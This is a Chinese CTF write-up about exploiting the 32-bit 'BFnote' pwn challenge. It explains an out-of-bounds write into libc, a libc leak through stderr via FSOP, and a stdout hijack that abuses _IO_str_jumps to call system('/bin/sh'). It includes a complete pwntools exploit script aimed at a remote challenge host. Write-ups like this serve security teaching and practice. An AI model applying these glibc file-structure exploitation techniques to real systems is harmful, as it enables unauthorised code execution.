@@ -1,0 +1,216 @@
+原创柠檬汽水合天智汇
+
+这次感受到了自己是多么的菜，打完hgame再来打这个感觉完全不是一个等级的pwn题，第一天只做出来一个，算是比较有质量的题吧，从比赛开始卡到我比赛结束，幸亏最后做出来了。
+
+![v2-eadab20a5d56eaf16b70ba2bc2e994a9_r.jp](https://pic2.zhimg.com/v2-eadab20a5d56eaf16b70ba2bc2e994a9_r.jpg)
+
+有两个很明显的溢出，第一个是栈溢出0x600,第二个是bss端0x600，然后程序让你输入notebook
+size，然后申请了相应大小的内存，然后输入titile size，对title size做了个检验，如果大于之前book
+size就重新输入，但是这里注意一下，新输入的值赋值给了i，但是第二次read是根据最开始输入的size来的，所以这里存在一个越界写的洞。那么接下来说说我自己的利用思路，踩坑无数才找到。
+
+1.malloc
+一个0x20000大小的内存，这样他会紧邻libc，偏移固定，所以可以越界写到libc里。这里我选择写到IO_list_all，把他写上bss段的地址，在bss端里伪造好file结构，控制它的虚表也指向bss段，在里面布置好main函数地址，所以程序在返回的时候通过执行exit函数，通过IO_list_all链表找到文件，从而执行该文件结构虚表里的_IO_flush_all_lockp函数，但是此时这个vtable被我们劫持了，无论调用哪个函数都会调用main函数，程序又跳回，这种利用方式是FSOP，同时我们注意到后面还有个fwrite,会输出我们越界写的地方里的内容，观察内存布局我们不难发现，他紧邻stderr，我们在里面填充好数据，就能顺便把stderr里面的libc数据带出来，从而我们可以leak出libc
+
+2.第二次越界写的时候我的第一个方案是改stdout的虚表，劫持虚表到bss段，bss段上埋好one gadget的地址。但是32位的库下one
+gadget不是很好用。在查阅资料之后，我发现还有另一种劫持虚表的办法，也就是2.24版本libc加入对vtable
+check之后的办法。加入的check就是检查虚表是否在libc规定的那个范围内，如果不在，就crash，所以那些大佬把目光投向了紧邻IO file
+jump的IO str jump，通过改虚表指针为IO str jump，从而改变控制流，
+
+![v2-a4c60a84a9e9c8b233f19725b32326e6_r.jp](https://pic4.zhimg.com/v2-a4c60a84a9e9c8b233f19725b32326e6_r.jpg)
+
+![v2-1d470cf4bd1b1fd5ff81cc753595bfc0_r.jp](https://pic2.zhimg.com/v2-1d470cf4bd1b1fd5ff81cc753595bfc0_r.jpg)
+
+调用fwrite最终会走到调用stdout虚表里的IO_xsputn，查阅资料后，我发现可以将其劫持为IO_str_overflow，因为这里有一个我们可以控制的函数指针，那我们应该怎样更改虚表呢。我们都知道虚表跳转是根据偏移来的，比如这次调用IO_xsputn，是虚表里第六项，而IO_str_overflow是第二项，所以我们可以将IO_file_jumps的地址改成IO_str_jumps的地址减16，也就是说下次再调用xsputn，就会根据相应偏移来找到相应的函数地址，再被劫持后调用xsputn就变成了调用IO_str_overflow，
+
+![v2-ce4d4b7ea9391a062e0064463020a9ff_r.jp](https://pic3.zhimg.com/v2-ce4d4b7ea9391a062e0064463020a9ff_r.jpg)
+
+这里我们可以查下源码，这里有几个条件需要绕过：
+
+1.flag位:flag & 0xC00 != 0x400，这也才能保证之后取到write_ptr的值(a1+20
+;//IDA的这个看不习惯可以去查下相关源码，可以更清晰).
+
+2.write_ptr - write_base >buf_end - buf_base.
+
+3.调试时发现的，应该伪造好_lock处的指针指向的值为0.
+
+这样就可以满足条件从而调用文件结构种偏移152处的函数指针指向的函数，参数是(buf_end -buf_base)*2+100，这样我们第二次越界写的时候就给stdout文件来次大换血，将其各处的值伪造好，从而劫持了控制流。
+
+fake_file我是这样伪造的
+
+fake_file = p32(0) #file_flag
+
+fake_file += p32(0)*3 #read_base read_ptr read_end
+
+fake_file += p32(0)+p32(system)+p32(0) #write_base write_ptr write_end
+
+fake_file += p32(0x804a060)+p32(0x804a060+0x4024ffe) #buf_base buf_end
+
+fake_file = fake_file.ljust(72,'\x00')
+
+fake_file += p32(0x804a080) #bypass get lock
+
+fake_file = fake_file.ljust(144,'\x00')
+
+fake_file += p32(fake+0x40+12+4)*2+p32(system)*2
+
+Exp如下:
+
+from pwn import *
+
+p = process('./BFnote')
+
+p = remote('node3.buuoj.cn',27361)
+
+elf = ELF('./BFnote')
+
+libc1 = ELF('./libc.so.6')
+
+libc2 = elf.libc
+
+print hex(libc1.symbols['_IO_2_1_stdout_'])
+
+print hex(libc2.symbols['_IO_2_1_stdout_'])
+
+#gdb.attach(p,'b* 0x8048907')
+
+p.recvuntil('Give your description : ')
+
+p.sendline('a'*0x10)
+
+p.recvuntil('Give your postscript : ')
+
+fake_file = p32(0xfbad2086)
+
+fake_file += p32(0x0)*3+p32(0x0)+p32(0x1)
+
+fake_file = fake_file.ljust(0x94,'\x00')
+
+fake_file += p32(0x804a060+0xa0)
+
+fake_file = fake_file.ljust(0xa0,'\x00')
+
+fake_file += p32(0x8048761)*20
+
+p.sendline(fake_file)
+
+p.recvuntil('Give your notebook size : ')
+
+p.sendline(str(0x20000))
+
+p.recvuntil('Give your title size : ')
+
+#size = 0x22000+0x1b3ca0
+
+p.sendline(str(0x1b3ca0+0x20fe8-0x2000)) #remote
+
+p.sendline(str(0x1b3ca0+0x20fe8))
+
+p.recvuntil('invalid ! please re-enter :\n')
+
+p.sendline(str(0x10))
+
+p.recvuntil('Give your title : ')
+
+p.sendline('a'*0x8)
+
+p.recvuntil('Give your note : ')
+
+p.sendline(p32(0x804a060)*2+'a'*0x4c)
+
+p.recvuntil('a'*0x4c)
+
+libc_addr = u32(p.recv(4))
+
+libc_err = libc_addr - 74
+
+#libc_base = libc_err - libc2.symbols['_IO_2_1_stderr_']
+
+libc_base = libc_err - libc1.symbols['_IO_2_1_stderr_'] #remote
+
+system = libc_base + libc1.symbols['system'] #remote
+
+#system = libc_base + libc2.symbols['system']
+
+print hex(system)
+
+print '[+]stderr_addr: '+hex(libc_err)
+
+print '[+]libc_base: '+hex(libc_base)
+
+print '[+]system_addr: '+hex(system)
+
+p.recvuntil('Give your description : ')
+
+p.sendline('\x00'*0x10)
+
+p.recvuntil('Give your postscript : ')
+
+p.sendline('/bin/sh'.ljust(0x100,'\x00'))
+
+p.recvuntil('Give your notebook size : ')
+
+p.sendline(str(0x20000))
+
+p.recvuntil('Give your title size : ')
+
+#size = 0x43000 + libc1.symbols['_IO_2_1_stdout_']+0x90 #remote
+
+size = 0x43000 + libc2.symbols['_IO_2_1_stdout_']+0x90
+
+fake = libc_base + libc1.symbols['_IO_file_jumps'] #remote
+
+#fake = libc_base + libc2.symbols['_IO_file_jumps']
+
+print hex(size)
+
+p.sendline(str(size-0xa8-0x2000)) #remote
+
+p.sendline(str(size-0xa8))
+
+p.recvuntil('invalid ! please re-enter :\n')
+
+p.sendline(str(0x10))
+
+p.recvuntil('Give your title : ')
+
+p.sendline('a'*0x8)
+
+p.recvuntil('Give your note : ')
+
+fake_file = p32(0) #file_flag
+
+fake_file += p32(0)*3 #read_base read_ptr read_end
+
+fake_file += p32(0)+p32(system)+p32(0) #write_base write_ptr write_end
+
+fake_file += p32(0x804a060)+p32(0x804a060+0x4024ffe) #buf_base buf_end
+
+fake_file = fake_file.ljust(72,'\x00')
+
+fake_file += p32(0x804a080) #bypass get lock
+
+fake_file = fake_file.ljust(144,'\x00')
+
+fake_file += p32(fake+0x40+12+4)*2+p32(system)*2
+
+p.sendline(fake_file)
+
+#gdb.attach(p)
+
+p.interactive()
+
+总结一下:
+
+发现越界写的漏洞，第一次越界写IO list
+all，利用FSOP是程序重新跳回main函数执行，同时填充缓冲区使其在调用fwrite时可以leak出libc地址，第二次越界写就篡改stdout文件，劫持其虚表，从而getshell
+
+点击链接做实验：《缓冲区溢出基础与实践》
+
+[实验:缓冲区溢出基础与实践(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=9613f998-8cd2-4981-9bc5-9900c97371de)
+
+（了解缓冲区溢出的原理与危害，掌握防范缓冲区溢出的基本方法，学会进行常见的缓冲区溢出攻击。）
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！
+
+  
+
